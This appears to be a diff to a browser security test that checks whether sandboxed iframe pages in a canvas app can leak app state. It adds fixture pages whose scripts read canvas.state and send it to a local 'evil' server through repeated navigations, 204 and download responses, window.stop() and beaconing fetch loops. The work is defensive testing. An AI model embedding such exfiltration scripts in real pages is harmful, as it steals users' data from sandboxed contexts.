@@ -11,6 +11,8 @@
 //   idle      the four pages above as idle thumbnails (no click), state "Ada Secret" set elsewhere
 //   typed     an interactive page that navigates on every keystroke
 //   play      a page reached in Play, after the name was typed in Play, that reads canvas.state
+//   n204 / download / stop (+ play versions)   navigations that commit no document (204, attachment, window.stop()), repeated every 100 ms
+//   beacon / playbeacon   a navigation to a page that itself requests every 100 ms; expect 1 request in all, the frame removed first
 //   fakeload / fakeplay   the same, from a thumbnail / in Play, after faking the page's own `load` event
 // Expected, by mode (the idle row follows IDLE_THUMBNAIL_SCRIPTS in src/sandbox/srcdoc.ts, read off the
 // frames' sandbox attribute):
@@ -34,10 +36,17 @@ const freePort = () => new Promise((r) => { const s = net.createServer().listen(
 
 // ---- the evil server
 const hits = [];
+const hung = [];
 const evilPort = Number(opt('--evil-port', 0)) || (await freePort());
 http
   .createServer((req, res) => {
     hits.push(req.url);
+    const p = req.url.split('?')[0];
+    if (p.endsWith('x')) return void res.writeHead(204).end(); // the beacon document's follow-up requests
+    if (p.includes('204')) return void res.writeHead(204).end(); // a navigation that commits no document
+    if (p.includes('download')) return void res.writeHead(200, { 'content-type': 'text/plain', 'content-disposition': 'attachment; filename=x.txt' }).end('x');
+    if (p.includes('stop')) return void hung.push(res); // never answers
+    if (p.includes('beacon')) return void res.writeHead(200, { 'content-type': 'text/html' }).end(`<h1>EVIL</h1><script>setInterval(() => fetch('${p}x?b=1'), 100)</script>`);
     res.writeHead(200, { 'content-type': 'text/html' });
     res.end('<h1 style="color:red">EVIL SITE</h1>');
   })
@@ -65,12 +74,22 @@ if (!appUrl) {
 }
 
 const state = `JSON.stringify(canvas.state)`;
+const loop = (k, stop = false) => `<h1>Innocent</h1><script>setInterval(() => { location.href = ${JSON.stringify(EVIL)} + '/${k}?s=' + encodeURIComponent(${state});${stop ? ' setTimeout(() => window.stop(), 30);' : ''} }, 100);</script>`;
 const evil = {
   location: `<h1>Innocent</h1><script>location.href = ${JSON.stringify(EVIL)} + '/location?s=' + encodeURIComponent(${state});</script>`,
   meta: `<h1>Innocent</h1><script>const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=${EVIL}/meta?s=' + encodeURIComponent(${state}); document.head.append(m);</script>`,
   navigation: `<h1>Innocent</h1><script>navigation.navigate(${JSON.stringify(EVIL)} + '/navigation?s=' + encodeURIComponent(${state}));</script>`,
   link: `<h1>Innocent</h1><script>const a = document.createElement('a'); a.href = ${JSON.stringify(EVIL)} + '/link?s=' + encodeURIComponent(${state}); document.body.append(a); a.click();</script>`,
   play: `<h1>Innocent</h1><script>location.href = ${JSON.stringify(EVIL)} + '/play?s=' + encodeURIComponent(${state});</script>`,
+  // navigations that never load a document (so no `load` fires on the frame), repeated, and one that lands on a page that beacons
+  n204: loop('n204'),
+  download: loop('download'),
+  stop: loop('stop', true),
+  beacon: `<h1>Innocent</h1><script>location.href = ${JSON.stringify(EVIL)} + '/beacon?s=' + encodeURIComponent(${state});</script>`,
+  play204: loop('play204'),
+  playdownload: loop('playdownload'),
+  playstop: loop('playstop', true),
+  playbeacon: `<h1>Innocent</h1><script>location.href = ${JSON.stringify(EVIL)} + '/playbeacon?s=' + encodeURIComponent(${state});</script>`,
   // a page that fakes its own `load` event (to look vouched for) and then leaves
   fakeload: `<h1>Innocent</h1><script>dispatchEvent(new Event('load')); location.href = ${JSON.stringify(EVIL)} + '/fakeload?s=' + encodeURIComponent(${state});</script>`,
   fakeplay: `<h1>Innocent</h1><script>dispatchEvent(new Event('load')); location.href = ${JSON.stringify(EVIL)} + '/fakeplay?s=' + encodeURIComponent(${state});</script>`,
@@ -107,7 +126,7 @@ try {
   console.log(`mode ${mode}; idle thumbnails: sandbox="${idleSandbox}" (${mode === 'strict' ? 'scripts on, navigation guard' : idleScripts ? 'scripts ON, no state' : 'scripts OFF'})`);
 
   // the evil pages, as idle thumbnails
-  const navKeys = ['location', 'meta', 'navigation', 'link', 'fakeload'];
+  const navKeys = ['location', 'meta', 'navigation', 'link', 'fakeload', 'n204', 'download', 'stop', 'beacon'];
   const idleKeys = [...navKeys, 'typed'];
   await page.evaluate(({ evil, idleKeys }) => {
     let i = 0;
@@ -126,7 +145,7 @@ try {
   await page.waitForTimeout(1500);
 
   // control: the pages really rendered and stayed put (blocked is not "never loaded"), or were removed
-  const leaked = (name) => hits.filter((h) => h.startsWith('/' + name + '?'));
+  const leaked = (name) => hits.filter((h) => { const p = h.split('?')[0]; return p === '/' + name || p === '/' + name + 'x'; }); // `x`: a beacon page's follow-up requests
   const stateOf = (h) => decodeURIComponent(h.split('?s=')[1] ?? '');
   const nav = {};
   for (const k of navKeys) {
@@ -140,7 +159,7 @@ try {
 
   // Play: name typed in Play, then a page that reads canvas.state and leaves. Each Play page also sits
   // on the canvas as an idle thumbnail; that request has no state, the Play one carries the name.
-  const playKeys = ['play', 'fakeplay'];
+  const playKeys = ['play', 'fakeplay', 'play204', 'playdownload', 'playstop', 'playbeacon'];
   await page.evaluate(({ html, signupId, playKeys }) => {
     for (const k of playKeys) {
       app.dispatch('page.create', { x: 1800, y: 600, title: 'Evil ' + k, html: html[k] });
@@ -203,6 +222,7 @@ try {
   code = 1;
 } finally {
   await browser.close();
+  for (const r of hung) r.destroy();
   for (const s of stops) await s();
   setTimeout(() => process.exit(code), 100);
 }
